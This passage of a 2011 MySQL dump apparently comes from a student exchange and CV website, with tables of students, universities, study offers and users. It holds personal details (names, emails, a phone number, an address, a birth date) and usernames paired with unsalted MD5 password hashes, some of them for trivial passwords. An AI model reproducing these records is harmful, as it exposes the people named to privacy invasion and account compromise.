(72, 0, '2011-08-07 01:21:24', '2012-02-08 12:00:00', 0, 'publish', 'forever'),
(73, 0, '2011-08-07 05:13:10', '2012-02-08 12:00:00', 0, 'publish', 'forever'),
(74, 0, '2011-08-07 07:07:56', '2012-02-08 12:00:00', 0, 'publish', 'forever'),
(75, 0, '2011-08-16 09:35:53', '2012-02-17 12:00:00', 0, 'publish', 'forever'),
(76, 0, '2011-08-16 10:13:46', '2012-02-17 12:00:00', 0, 'publish', 'forever'),
(77, 0, '2011-08-16 11:51:36', '2012-02-17 12:00:00', 0, 'publish', 'forever'),
(78, 0, '2011-08-10 00:00:00', '2011-08-26 00:00:00', 0, 'draft', 'from'),
(79, 0, '2011-08-17 09:41:44', '2012-02-18 12:00:00', 0, 'publish', 'forever'),
(80, 0, '2011-08-17 09:43:05', '2012-02-18 12:00:00', 0, 'publish', 'forever'),
(81, 0, '2011-08-18 02:09:39', '2012-02-19 12:00:00', 0, 'publish', 'forever'),
(82, 0, '2011-08-18 02:13:49', '2012-02-19 12:00:00', 0, 'publish', 'forever');

-- --------------------------------------------------------

--
-- Table structure for table `students`
--

CREATE TABLE `students` (
  `ID` bigint(20) NOT NULL auto_increment,
  `Name` varchar(100) NOT NULL,
  `Surname` varchar(100) NOT NULL,
  `Date_of_birth` date NOT NULL,
  `Country` varchar(80) NOT NULL,
  `City` varchar(80) NOT NULL,
  `Address` varchar(200) NOT NULL,
  `Phone_number` varchar(30) NOT NULL,
  `Email` varchar(200) NOT NULL,
  `Nationality` varchar(50) NOT NULL,
  `Fax` varchar(20) NOT NULL,
  `Gender` varchar(3) NOT NULL,
  `Desired_employment` varchar(100) NOT NULL,
  `job_dates` varchar(100) NOT NULL,
  `Occupation` varchar(200) NOT NULL,
  `responsibilities` varchar(200) NOT NULL,
  `name_address` varchar(300) NOT NULL,
  `type` varchar(100) NOT NULL,
  `education_date` varchar(30) NOT NULL,
  `title_awarded` varchar(100) NOT NULL,
  `Principal_subjects` varchar(1000) NOT NULL,
  `name_of_organisation` varchar(500) NOT NULL,
  `level` varchar(100) NOT NULL,
  `education_field` varchar(200) NOT NULL,
  `mother_tongue` varchar(100) NOT NULL,
  `other_languages` varchar(500) NOT NULL,
  `social_skills` varchar(1000) NOT NULL,
  `organisational_skills` varchar(1000) NOT NULL,
  `technical_skills` varchar(1000) NOT NULL,
  `computer_skills` varchar(1000) NOT NULL,
  `artistic_skills` varchar(1000) NOT NULL,
  `other_skills` varchar(1000) NOT NULL,
  `driving_licence` int(2) NOT NULL,
  `additional_information` varchar(1000) NOT NULL,
  `annexes` varchar(1000) NOT NULL,
  PRIMARY KEY  (`ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=47 ;

--
-- Dumping data for table `students`
--

INSERT INTO `students` (`ID`, `Name`, `Surname`, `Date_of_birth`, `Country`, `City`, `Address`, `Phone_number`, `Email`, `Nationality`, `Fax`, `Gender`, `Desired_employment`, `job_dates`, `Occupation`, `responsibilities`, `name_address`, `type`, `education_date`, `title_awarded`, `Principal_subjects`, `name_of_organisation`, `level`, `education_field`, `mother_tongue`, `other_languages`, `social_skills`, `organisational_skills`, `technical_skills`, `computer_skills`, `artistic_skills`, `other_skills`, `driving_licence`, `additional_information`, `annexes`) VALUES
(30, 'Nedim', 'HadÅ¾iÄ‡', '1989-05-12', 'Bosnia and Herzegovinia', 'Sarajevo', 'Gradacacka 31', '+38761575740', 'nedimhadzija@gmail.com', 'Bosnian', '', 'M', 'Developer', 'January and February of 2008', 'Technical person', 'Fixing the computers, hardware and software.', 'Zenica, Travnicka ulica', 'Computer service', '2008-2011', 'Bachelor of Computer Science,\r\nNetwork administrator', 'Operating systems, Discrete mathematics, Software development, Logic design, Object oriented analysis and design \r\nhttp://www.etf.unsa.ba/index.php?id=377', 'Faculty of Electrical Engineering, University of Sarajevo\r\nCISCO Academy', 'ECTS  	 -  	 Number of credit points ', 'Computer Science', 'Bosnian', 'English, very good,\r\nGerman, basics', 'Yes', 'Yes', 'Yes', 'Yes', 'No', 'Yes', 1, 'Yes', 'Yes'),
(31, 'board2011', 'b', '0000-00-00', 'europe', 'europe', '', '', 'greggchrysos@gmail.com', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', 0, '', ''),
(32, 'Shatlyk', 'Ashyralyev', '0000-00-00', 'Turkey', 'Ankara', '', '', 'ashyralyevsh@gmail.com', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', 0, '', ''),
(33, 'Test', 'Test', '0000-00-00', 'jsfhjs', 'nesto', '', '', 'miladinovic.ivica@gmail.com', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', 0, '', ''),
(34, 'Ivica', 'MiladinoviÄ‡', '0000-00-00', 'Serbia', 'Belgrade', '', '', 'miladinovic.ivica@gmail.com', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', 0, '', ''),
(35, 'Nedim', 'HadÅ¾iÄ‡', '0000-00-00', 'Bosnia and Herzegovinia', 'Sarajevo', '', '', 'nedim.hadzic@eestec-sa.ba', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', 0, '', ''),
(36, 'dfhgjdfhgkj', 'djfghjdfghdj', '0000-00-00', 'jdfhfjghdfgjh', 'jdfghdjgh', '', '', 'neki.ba@gmaill.com', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', 0, '', ''),
(37, 'Ivica', 'Mialdin', '0000-00-00', 'asgasg3', 'asfaf', '', '', 'miladinovic.ivica@gmail.com', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', 0, '', ''),
(38, 'Denza', 'R', '0000-00-00', 'BiH', 'Sarajevo', '', '', 'denisrudonja@gmail.com', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', 0, '', ''),
(39, 'Nedim', 'Neki', '0000-00-00', 'Bosnia and Herzegovinia', 'Zenica', '', '', 'nedim.hadzic@eestec-sa.ba', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', 0, '', ''),
(43, 'jah', '111', '0000-00-00', 'Bosna i hercegovina', 'Sarajevo', '', '', 'elma.lagumdzija@gmail.com', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', 0, '', ''),
(44, 'a', 'a', '0000-00-00', '1', '1', '', '', 'a@gmail.com', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', 0, '', ''),
(41, 'Armin', 'Beširović', '0000-00-00', 'Germany', 'Munich', '', '', 'armin@linux.org.ba', '', '', 'M', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', 0, '', ''),
(42, '111', 'Lagumdzija', '0000-00-00', 'Bosnia and Herzegovina', 'Sarajevo', '', '', 'elma.lagumdzija@gmail.com', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', 0, '', ''),
(45, 'Hamo', 'Levat', '0000-00-00', 'Bolivia', 'Zenica', '', '', 'chairman@eestec-sa.ba', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', 0, '', ''),
(46, 'Hamo', 'Dobar', '0000-00-00', 'Albania', 'Zenica', '', '', 'chairman@eestec-sa.ba', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', 0, '', '');

-- --------------------------------------------------------

--
-- Table structure for table `universitys`
--

CREATE TABLE `universitys` (
  `ID` int(11) NOT NULL auto_increment,
  `Logo` varchar(200) NOT NULL,
  `Name_of_University` varchar(200) NOT NULL,
  `Name_of_Faculty` varchar(200) NOT NULL,
  `Address` varchar(200) NOT NULL,
  `City` varchar(200) NOT NULL,
  `ZIP_code` varchar(50) NOT NULL,
  `Country` varchar(200) NOT NULL,
  `Contact_person` varchar(200) NOT NULL,
  `Phone_number` varchar(50) NOT NULL,
  `Fax` varchar(50) NOT NULL,
  `Web` varchar(200) NOT NULL,
  `Email` varchar(150) NOT NULL,
  `Facebook` varchar(300) NOT NULL,
  `Twitter` varchar(150) NOT NULL,
  `Other` varchar(150) NOT NULL,
  `Number_of_students` varchar(50) NOT NULL,
  `About_University` text NOT NULL,
  `About_Faculty` text NOT NULL,
  `Username` varchar(100) NOT NULL,
  `Password` varchar(150) NOT NULL,
  `Login_email` varchar(150) NOT NULL,
  `Date_of_expire` date NOT NULL,
  `date_of_creation` date NOT NULL,
  `Status` varchar(30) NOT NULL,
  PRIMARY KEY  (`ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=15 ;

--
-- Dumping data for table `universitys`
--

INSERT INTO `universitys` (`ID`, `Logo`, `Name_of_University`, `Name_of_Faculty`, `Address`, `City`, `ZIP_code`, `Country`, `Contact_person`, `Phone_number`, `Fax`, `Web`, `Email`, `Facebook`, `Twitter`, `Other`, `Number_of_students`, `About_University`, `About_Faculty`, `Username`, `Password`, `Login_email`, `Date_of_expire`, `date_of_creation`, `Status`) VALUES
(12, 'img/thumbs/avatar.jpg', 'University of Sarajevo', 'Faculty of Electrical Engineering', 'Zmaja od Bosne bb, Kampus Univerziteta', 'Sarajevo', '71000', 'Bosnia and Herzegovinia', 'Neko', '++387 33 250 700', '++387 33 250 725', 'etf.unsa.ba', 'nh15234@etf.unsa.ba', 'http://www.facebook.com/pages/Faculty-of-Electrical-Engineering-Sarajevo/106471512723498', '', '', '5000', 'U akademskoj 2008/2009. g. na Univerzitetu u Sarajevu broj stalno zaposlenog osoblja iznosi 2292, od Ã¨ega je 1302 nastavnika i saradnika zaposlenih u stalnom radnom odnosu, dok je 990 broj stalno zaposlenih u administraciji, te pomoÃ¦nog i tehniÃ¨kog osoblja na Univerzitetu. Ukupan broj studenata upisanih na Univerzitet u Sarajevu u akademskoj 2008/2009. g. iznosi 40.273, od Ã¨ega je 27.403 redovnih studenata, dok se ostatak broja upisanih studenata odnosi na kategorije redovnih samofinansirajuÃ¦ih i vanrednih studenata.\r\n\r\nBudÅ¾et Univerziteta u Sarajevu u 2008. godini iznosi cca 105 miliona KM, od Ã¨ega cca 40 miliona KM spada u vanbudÅ¾etske prihode fakulteta/akademija Univerziteta.', 'Faculty of Electrical Engineering in Sarajevo was established in 1961, with first generation of students enrolled a year earlier, within existing Technical faculty in Sarajevo. In the year 2010 Faculty is celebrating 50 years of its existance.\r\n \r\nToday, Faculty is located at University of Sarajevo campus situated in the city center. For certain specialized laboratories, Faculty uses facilities in public companies Elektroprivreda (Power company) B&H and Telecom B&H. \r\n \r\nSince its establishment Faculty of Electrical Engineering has promoted: \r\n4646 Graduated Engineers \r\n312 Masters of Sciences \r\n105 Doctors of Technical Sciences\r\nFaculty teaching staff â€“ full time: \r\n32 professors \r\n25 teaching assistants\r\nFaculty teaching staff â€“ part time: \r\n20 professors \r\n40 teaching assistants\r\nOr in total 117 employed in educational and research activities.\r\n \r\nIn current academic year, 2009/10, Faculty attends: \r\n1091 undergraduate and graduate students ( Bologna process )\r\n287 postgraduate students ( ante Bologna )\r\n \r\nStudy programs are divided among four departments: \r\nAutomatic Control and Electronics, \r\nComputing and Informatics, \r\nElectrical Power Engineering, \r\nTelecommunication.\r\n  \r\nStudy programs curriculums comply with Bologna process principles and credit system (ECTS â€“ European credit transfer system), and currently there are two cycle students studying on first cycle in duration of six semesters ( 180 ECTS) leading to the diploma title of Bachelor of Electrical engineering in one of four above mentioned four disciplines, and second cycle in duration of four semesters (120 ECTS) ending with title of Master of Electrical engineering in four disciplines. \r\n \r\nThis Bologna harmonized curriculum enables student mobility during studies on both cycles and diploma equivalency within European Higher Education Area (ERA and EHEA). \r\n \r\nAfter finishing first (Bachelor) and second (Master) cycle student can find employment or continue studying in third cycle (Doctorate) lasting three more years (180 ECTS points). Completion of this cycle enables student to become Doctor of Technical Sciences. \r\nThird cycle of studies at Faculty of Electrical Engineering Sarajevo will start in academic year 2010/11 when first ETF-B students complete second cycle. \r\n \r\nIn order to obtain international verification and recognition of curriculli quality, Faculty is preparing intensively for curriculli accreditation by some renown European agency. For that purpose, during fall semester of 2008/9 academic year, faculty performed test accreditation of first cycle curriculum for Department of Computing and Informatics with well known German accreditation agency ASIIN. \r\n \r\nFurther to its basic educational activities, Faculty of Electrical Engineering Sarajevo has, since its establishment until today, always been a place of intensive scientific research and development and other activities related to promotion of science and technology, \r\n \r\nFaculty used to have a number of laboratories within its prewar location in Lukavica, where a number of scientific and development projects, contracted with government science funds and other agencies or industrial giants like Energoinvest, Elektroprivreda B&H, Unis, Famos and others, were implemented. \r\n \r\nFaculty also implemented numerous scientific development projects for Scientific departments of Federal and Republic level, and during 1985-1991 period was even leader of several big project named DC (Society goals) that had substantial resources and budget for multiyear research and development within country of that time, Yugoslavia. \r\n \r\nIn years after war, starting in 1996, Faculty manages to return to research and development activities and implement over 80 research projects and studies for renowned partners like: PE Elektroprivreda B&H, PE BH Telecom, Energoinvest, RMU Banovici, DD Cement factory Kakanj, HT Mostar, Bosna-S and others. \r\n \r\nFaculty teaching staff, full and part time, is very active in scientific research and professional work, even with very modest laboratory resources that Faculty has nowadays. \r\n \r\nIn a period before the war Faculty staff members working in research and development centers in Energoinvest, Unis, Elektroprivreda B&H, Famos and others, applied for and got verification for over 20 patents worldwide. \r\n \r\nCurrently, Faculty implements 8 projects for Cantonal Ministry of Education and Science of Canton Sarajevo, 4 projects for Federal Ministry of Education and Science, 2 international scientific cooperation projects within FP6, 2 within European union framework FP7, 2 Tempus projects, and 5 projects for customers from industry that Faculty has contracts on business and technical cooperation. More data on those projects can be found at ETF Web portal: www.etf.unsa.ba \r\n \r\nFaculty of Electrical Engineering Sarajevo organizes international scientific gatherings and symposiums, successors of well known and very referent Symposium, at the time, held at Jahorina devoted to information technologies: \r\nBIHTEL, bi-yearly symposium on Telecommunications (even years) \r\nICAT, bi-yearly symposium on Information, Communication and Automation technologies (odd years) \r\nICAT 2009 Symposium held from October 29-31 , 2009 was sponsored by IEEE and ACM societies and all accepted and presented papaers were included in IEEE digital library and IEEEXplore database, providing high quality reference for the conference and the authors of presented papers.\r\n\r\nFaculty members, working with modest material and financial resources for scientific and research work, manage to follow and actively participate in research, publishing their scientific and professional papers in journals and scientific conferences with international reviews indexed by recognized referent databases. \r\nSo that, in last two years 2006 and 2007 only, over 30 papers have been published or submitted and indexed by referent databases verified by University of Sarajevo Senate. Those databases include: CC, SCI, ACM Digital Library, IEEEXplore, INSPEC, Elsevier: Compendex database, Engineering Index, Science Direct, Scopus, then Information Science Abstracts, Energy Science and Technology, ISI Proceedings, and for mathematic sciences Zentralblatt Math I MathSciNet. \r\nSome important international associations that Faculty of Electrical Engineering Sarajevo takes part or is member of, are membership in HP-SUA (Hewlett Packard Software University Association), and participation of Faculty staff in IEEE B&H Section and its three chapters ( Computer society, Control system society and Telecommunication society) that were initially established at this Faculty.', 'etfsarajevo', '5cce38a2f2c882a660f64c9d378aff82', 'nh15234@etf.unsa.ba', '2011-09-16', '2011-08-05', 'Active'),
(13, 'img/thumbs/avatar.jpg', 'e', 'e', 'e', 'e', '', 'e', '', '', '', '', '', '', '', '', '', '', '', 'elmaars1', '818e6567f6352616bd02d09be0ac853a', 'elms.a@hotmail.com', '2011-09-16', '2011-08-16', 'Active'),
(14, 'img/thumbs/avatar.jpg', 'Dobar pravo', 'Isto dobar', 'Negdje, niko ne zna gdje je', 'Nepoznato', '', 'Kenya', '', '', '', '', '', '', '', '', '', '', '', 'nepoznato', '0b6672ec1d3273db1cad55220dee6219', 'chairman@eestec-sa.ba', '2011-09-18', '2011-08-18', 'Deactivated');

-- --------------------------------------------------------

--
-- Table structure for table `university_study`
--

CREATE TABLE `university_study` (
  `ID` int(11) NOT NULL auto_increment,
  `type` varchar(50) NOT NULL,
  `Bachelor` tinyint(1) NOT NULL,
  `Master` tinyint(1) NOT NULL,
  `Research` tinyint(1) NOT NULL,
  `Taught` tinyint(1) NOT NULL,
  `PhD` tinyint(1) NOT NULL,
  `Academic_PhD` tinyint(1) NOT NULL,
  `Professional_doctorate` tinyint(1) NOT NULL,
  `Predefined_PhD_project` tinyint(1) NOT NULL,
  `Open_PhD_programme` tinyint(1) NOT NULL,
  `Both` tinyint(1) NOT NULL,
  `Number_of_places` varchar(500) NOT NULL,
  `Department` varchar(500) NOT NULL,
  `Maximum_duration` tinyint(1) NOT NULL,
  `Winter` tinyint(1) NOT NULL,
  `Summer` tinyint(1) NOT NULL,
  `Years` varchar(200) NOT NULL,
  `English` tinyint(1) NOT NULL,
  `German` tinyint(1) NOT NULL,
  `Franch` tinyint(1) NOT NULL,
  `Spanish` tinyint(1) NOT NULL,
  `Italian` tinyint(1) NOT NULL,
  `Other` varchar(150) NOT NULL,
  `Topic` varchar(500) NOT NULL,
  `Required_average_grade` varchar(200) NOT NULL,
  `Out_of` varchar(200) NOT NULL,
  `Scjolarship` tinyint(1) NOT NULL,
  `Full_funding_provided` tinyint(1) NOT NULL,
  `Partially_funding_provided` tinyint(1) NOT NULL,
  `Contact_person` tinyint(1) NOT NULL,
  `Name_and_surname` varchar(200) NOT NULL,
  `CDepartment` varchar(200) NOT NULL,
  `Email` varchar(200) NOT NULL,
  `Telephone` varchar(50) NOT NULL,
  `Day` tinyint(4) NOT NULL,
  `Month` tinyint(4) NOT NULL,
  `Year` smallint(6) NOT NULL,
  `date_of_creation` datetime NOT NULL,
  PRIMARY KEY  (`ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=10 ;

--
-- Dumping data for table `university_study`
--

INSERT INTO `university_study` (`ID`, `type`, `Bachelor`, `Master`, `Research`, `Taught`, `PhD`, `Academic_PhD`, `Professional_doctorate`, `Predefined_PhD_project`, `Open_PhD_programme`, `Both`, `Number_of_places`, `Department`, `Maximum_duration`, `Winter`, `Summer`, `Years`, `English`, `German`, `Franch`, `Spanish`, `Italian`, `Other`, `Topic`, `Required_average_grade`, `Out_of`, `Scjolarship`, `Full_funding_provided`, `Partially_funding_provided`, `Contact_person`, `Name_and_surname`, `CDepartment`, `Email`, `Telephone`, `Day`, `Month`, `Year`, `date_of_creation`) VALUES
(9, '', 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, '5', 'Computer Science', 1, 0, 0, '1', 1, 0, 0, 0, 0, '', '', '', '', 0, 0, 0, 1, 'Nedim Hadzic', 'Computer Science', 'nedimhadzija@gmail.com', '', 7, 10, 2011, '2011-08-06 00:59:12');

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `ID` bigint(20) NOT NULL auto_increment,
  `Name` varchar(100) NOT NULL,
  `Surname` varchar(100) NOT NULL,
  `City` varchar(80) NOT NULL,
  `Country` varchar(80) NOT NULL,
  `Date_of_birth` date NOT NULL,
  `Email` varchar(200) NOT NULL,
  `Username` varchar(50) NOT NULL,
  `Password` varchar(60) NOT NULL,
  `Eestec` tinyint(1) NOT NULL,
  `Photo` varchar(400) NOT NULL,
  `Status` varchar(50) NOT NULL,
  `date_of_creation` datetime NOT NULL,
  `CV` bigint(20) NOT NULL,
  `Last_login` datetime NOT NULL,
  PRIMARY KEY  (`ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=45 ;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`ID`, `Name`, `Surname`, `City`, `Country`, `Date_of_birth`, `Email`, `Username`, `Password`, `Eestec`, `Photo`, `Status`, `date_of_creation`, `CV`, `Last_login`) VALUES
(28, 'Nedim', 'HadÅ¾iÄ‡', 'Sarajevo', 'Bosnia and Herzegovinia', '1989-05-12', 'nh15234@etf.unsa.ba', 'nedo99', 'f6482df9054ea631a2e92608a22e406b', 1, 'img/thumbs/img4e4c06bff2073.jpg', 'Active', '2011-08-05 16:15:38', 30, '2011-08-05 16:15:38'),
(29, 'board2011', 'b', 'europe', 'europe', '0000-00-00', 'greggchrysos@gmail.com', 'board2011', '2ed6a9a895be8e7d1cf972d2c3e8e889', 1, 'img/thumbs/avatar.jpg', 'Active', '2011-08-07 19:06:17', 31, '2011-08-07 19:06:17'),
(30, 'Shatlyk', 'Ashyralyev', 'Ankara', 'Turkey', '0000-00-00', 'ashyralyevsh@gmail.com', 'shatlyk', '600d7138a58a218fb8a528464853a00d', 1, 'img/thumbs/avatar.jpg', 'Active', '2011-08-08 00:44:48', 32, '2011-08-08 00:44:48'),
(31, 'Test', 'Test', 'nesto', 'jsfhjs', '0000-00-00', 'miladinovic.ivica@gmail.com', 'jasamtaj', '5887897389403b0a57be2797a1955330', 1, 'img/thumbs/avatar.jpg', 'Active', '2011-08-16 14:54:58', 33, '2011-08-16 14:54:58'),
(32, 'Ivica', 'MiladinoviÄ‡', 'Belgrade', 'Serbia', '0000-00-00', 'miladinovic.ivica@gmail.com', 'ivicaeestec', '332b1ceabc815957302cbef85296d74f', 1, 'img/thumbs/img/junk', 'Active', '2011-08-16 15:01:07', 34, '2011-08-16 15:01:07'),
(33, 'Nedim', 'HadÅ¾iÄ‡', 'Sarajevo', 'Bosnia and Herzegovinia', '0000-00-00', 'nedim.hadzic@eestec-sa.ba', 'hadzija', 'a04a70f5446835fcf0a112f21d7eb60a', 1, 'img/thumbs/avatar.jpg', 'Active', '2011-08-16 15:36:56', 35, '2011-08-16 15:36:56'),
(34, 'dfhgjdfhgkj', 'djfghjdfghdj', 'jdfghdjgh', 'jdfhfjghdfgjh', '0000-00-00', 'nedimhadzija@gmail.com', 'dfsjsdgh', 'e10adc3949ba59abbe56e057f20f883e', 1, 'img/thumbs/avatar.jpg', 'Deactivated', '2011-08-16 15:57:49', 36, '2011-08-16 15:57:49'),
(35, 'Ivica', 'Mialdin', 'asfaf', 'asgasg3', '0000-00-00', 'miladinovic.ivica@gmail.com', 'Ivicaaklsdjfl', '3781b9679e0ddc9a31396488f7187d29', 1, 'img/thumbs/avatar.jpg', 'Active', '2011-08-16 16:09:11', 37, '2011-08-16 16:09:11'),
(36, 'Denza', 'R', 'Sarajevo', 'BiH', '0000-00-00', 'denisrudonja@gmail.com', 'denisr', '6384298b8ac268b7b48d0495b044c0d2', 1, 'img/thumbs/avatar.jpg', 'Active', '2011-08-16 17:43:10', 38, '2011-08-16 17:43:10'),
(37, 'Nedim', 'Neki', 'Zenica', 'Bosnia and Herzegovinia', '0000-00-00', 'nedim.hadzic@eestec-sa.ba', 'nedimaga', '1cd6deefb28823e42e839765d9ebf301', 1, 'img/thumbs/avatar.jpg', 'Deactivated', '2011-08-16 19:06:25', 39, '2011-08-16 19:06:25'),
(40, '111', 'Lagumdzija', 'Sarajevo', 'Bosnia and Herzegovina', '0000-00-00', 'elma.lagumdzija@gmail.com', 'okicee', '0aae070636740141b37dce697ccea627', 1, 'img/thumbs/avatar.jpg', 'Active', '2011-08-17 22:46:17', 42, '2011-08-17 22:46:17'),
(39, 'Armin', 'Besirovic', 'Munich', 'Germany', '0000-00-00', 'armin@linux.org.ba', 'abesirovic2', '5f4dcc3b5aa765d61d8327deb882cf99', 1, 'img/thumbs/avatar.jpg', 'Active', '2011-08-16 22:17:13', 41, '2011-08-16 22:17:13'),
(41, 'jah', '111', 'Sarajevo', 'Bosna i hercegovina', '0000-00-00', 'elma.lagumdzija@gmail.com', 'tralalala', '0b4e7a0e5fe84ad35fb5f95b9ceeac79', 1, 'img/thumbs/avatar.jpg', 'Active', '2011-08-17 23:20:30', 43, '2011-08-17 23:20:30'),
(42, 'a', 'a', '1', '1', '0000-00-00', 'a@gmail.com', 'wwwwww', 'd785c99d298a4e9e6e13fe99e602ef42', 1, 'img/thumbs/avatar.jpg', 'Active', '2011-08-17 23:22:11', 44, '2011-08-17 23:22:11'),
(44, 'Hamo', 'Dobar', 'Zenica', 'Albania', '0000-00-00', 'chairman@eestec-sa.ba', 'nekodobro', '8f8e5dd0c493d40ad97f24f15338f18d', 0, 'img/thumbs/avatar.jpg', 'Deactivated', '2011-08-18 01:39:37', 46, '2011-08-18 01:39:37');
